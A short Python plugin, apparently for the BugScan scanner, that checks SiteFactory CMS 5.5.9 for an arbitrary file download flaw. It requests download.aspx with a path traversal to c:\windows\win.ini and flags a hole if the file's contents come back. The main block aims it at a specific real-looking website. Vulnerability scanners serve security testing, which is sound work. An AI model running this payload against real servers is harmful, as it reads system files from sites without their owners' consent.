#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ali
#_FileName_ = SiteFactory CMS 5.5.9.py
#https://www.bugscan.net/#!/x/22441

def assign(service, arg):
    if service == "sitefactory":
        return True, arg
    
def audit(arg):
    payload = 'sitefactory/assets/download.aspx?file=c%3a\windows\win.ini'
    target = arg + payload
    code,head,body,_,_ = curl.curl2(target)
    if code == 200 and '[mci extensions]' in body:
        security_hole(arg)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('sitefactory', 'http://www.astridlindgrenshembygd.se/')[1])